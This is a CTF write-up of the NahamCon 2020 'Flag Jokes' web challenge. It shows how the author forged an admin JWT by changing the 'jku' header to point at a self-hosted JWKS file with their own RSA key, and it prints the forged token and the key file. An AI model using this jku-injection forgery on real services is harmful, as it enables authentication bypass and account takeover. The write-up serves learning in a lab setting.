---
title: Nahamcon 2020 - Flag Jokes
published: true
---

I only solved a few challenges this CTF as I didn't have time to play, and this was the most interesting non-guessy one.

---

# Flag Jokes

#### Category: Web | 76 solves | 200 points

Want to hear a joke? Want the flag? How about both? Why don't YOU tell me a joke!

Note, it is recommended to clear your cookies for this challenge as some may have the same names used in other challenges.

Connect here:     
http://jh2i.com:50010

----

We see a login form so we try logging in as `admin`. Sadly it was blocked, so let's login as `test123` instead.

Apparently the flag is supposed to show up here, but we don't see it because we are not admin.

Analysing the JWT:     
```
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9zdGF0aWMvandrcy5qc29uIiwia2lkIjoic3FjRTFhOWdqOXAwOHpOTVIxTVdiTEx2dWFQeVVlSkVzQ2xCaHk3UTRKYyJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMifQ.N5AGhe3X2GccJ2WYT7S5rdiwx9hs3UOZ8ksCys4qv5SMp3b6ADeT4qwBWNsCpnNp0vvd_onY-la1UnWW-2mz_OSkXxkf9ljYXLbV8SEbCaTWYdAL_15PvIGW27mHV7Pm_1OWsYid2uT8wU3IDwqx9RmOofJLeMDjUoIf6-rjtdvPF958ZjTDe5HkML8fVotOv1HPKKYm99JH_fZ2fVx-zrbsnt_gWhBMuB9eePe2QSWOn-CJxl1LJzAJ4e143pWBfzG2gBUhCSEe3thSIXcud5Kf6lurNuqTJL0VrQzArGL5SVKsk5erFajKhLfKjGDZ4sIfr_hDiJpjDQnNO0MQ8w
```

We can see that the `jku` value points to `/static/jwks.json`, so we try accessing it on http://jh2i.com:50010/jwks.json 

As I wasn't sure what JWKS was, I went to read [this article](https://auth0.com/docs/tokens/concepts/jwks) by auth0 and it helped me.

Moving on, we try to change the payload `username` to `admin`, using a self-signed RSA key and hosting the jwks on my server.

Final JWT:    
```
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMTguMjcuMjcuMjA4L2p3a3MuanNvbiIsImtpZCI6InNxY0UxYTlnajlwMDh6Tk1SMU1XYkxMdnVhUHlVZUpFc0NsQmh5N1E0SmMifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.L6YqcYuXMzajyQdccRVyYIr2jN9_3IJKog9UgSvGLiNd9saTtCF5cGemBSyzDZZhv2WJDwjz9adVZoUnBpD2YGdh7ExT7g65rXxRhm-xrBtYCCETuYtVUXPErTTtYlLYM4nP7KitS6q1w4Da1JjKDYgCduus1fuPl5mCFLMriymPlrBBC_u5Pwx6PLElfuFv7IncDByT3zKuBog2KP97LRK5kacDsMk3OuP9tI0BihbrjcJiVpae-td74iFMSQxaaclnRgecavSKMbKY3E1__UJAWI6s8ZCri8r8ZKKoUdwvWd3E63U-bi1FvaQAAoFYYNaWqllc5TbJApjGOQjhTg
```

And the file on my server:
```
{
  "keys": [
       {
        "e": "AQAB",
        "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc",
        "kty": "RSA",
        "n":"36QCY7FHG9WI5jWtZXbhE_ryI2LkfDM2e4IdY61t2lgdeL7XN6nh4wijseQ6gGhTAYJVuLEqkUMgtLTbgywRvQi8xq1IJjs7eW55OWOl6r8ASWOahqf_QT-QIq6grnxJNwaDlXiJtQod0phftTWagVi4u7UnnZ82NsDM3UZWzt_T4dDlx4qzy7_wsntSAd3EC4DVMhxhyX2DhCIqylSO1IyVce4kGEBy8fs8FCAoxyuH56jEXOn0s_1TeL0lf346Bm7vVGpRCr4gH3S0-FsM_prP-KRaYh0KFnaoJ0lc1VcgntVvSEniuvuDJzSzeyzP7uHB5k5kq7hM4NALQ1kHNw"
        }
           ]
}
```
And we got the flag!

![FLAG](../assets/nahamcon-2020/flag.png)

<details>
  <summary>FLAG</summary>
  
  flag{whoops_typo_shoulda_been_flag_jwks}
</details>
                         

I was stuck prior to the final step initially because I missed the format of JWKS - my generated file was only JWK and not a set like on the server. 

Anyway it was a good learning experience!

